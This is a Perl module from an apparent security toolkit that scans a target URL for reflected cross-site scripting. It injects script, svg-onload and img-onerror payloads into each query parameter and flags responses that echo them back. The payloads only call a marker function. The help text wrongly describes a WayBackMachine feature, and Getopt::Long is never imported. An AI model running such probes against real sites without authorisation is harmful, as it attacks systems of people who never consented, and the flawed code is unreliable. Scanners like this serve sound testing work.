package Spellbook::Exploit::Reflected_XSS {
    use strict;
    use warnings;
    use Mojo::UserAgent;
    use Mojo::Parameters;
    use Mojo::URL;
    use UUID::Tiny ':std';
    use Try::Tiny;

    our $VERSION = '0.0.1';

    sub new {
        my ($self, $parameters) = @_;
        my ($help, $target, @result);

        Getopt::Long::GetOptionsFromArray (
            $parameters,
            'h|help'     => \$help,
            't|target=s' => \$target
        );

        if ($target) {
            if ($target !~ /^http(s)?:\/\//msx) {
                $target = "https://$target";
            }

            my $userAgent = Mojo::UserAgent -> new();
            my $parsedUrl = Mojo::URL -> new($target);
            my $query     = $parsedUrl -> query();

            if ($query) {
                my $baseParameters = Mojo::Parameters -> new($query);
                my @parameterNames = @{$baseParameters -> names};
                my %matchedUrls;
                my @payloadTemplates = (
                    "<script>SpellbookReflect('%s')</script>",
                    "\"><svg onload=SpellbookReflect('%s')>",
                    "<img src=x onerror=SpellbookReflect('%s')>"
                );

                foreach my $parameterName (@parameterNames) {
                    foreach my $payloadTemplate (@payloadTemplates) {
                        my $token   = create_uuid_as_string(4);
                        my $payload = sprintf $payloadTemplate, $token;
                        my $testParameters = Mojo::Parameters -> new($query);

                        $testParameters -> remove($parameterName);
                        $testParameters -> append($parameterName, $payload);

                        my $testUrl = $parsedUrl -> clone();
                        $testUrl -> query($testParameters);

                        try {
                            my $response = $userAgent -> get($testUrl) -> result();

                            if ($response -> is_success()) {
                                my $content = $response -> body();

                                if ($content =~ /\Q$payload\E/msx) {
                                    $matchedUrls{$testUrl} = 1;
                                }

                                if ($content =~ /\Q$token\E/msx) {
                                    $matchedUrls{$testUrl} = 1;
                                }
                            }
                        } catch {
                            1;
                        };
                    }
                }

                push @result, sort keys %matchedUrls;
            }
            
            return @result;
        }

        if ($help) {
            return "
                \rExploit::Reflected_XSS
                \r=====================
                \r-h, --help     See this menu
                \r-t, --target   Set an website to see paths from WayBackMachine\n";
        }

        return 0;
    }
}

1;
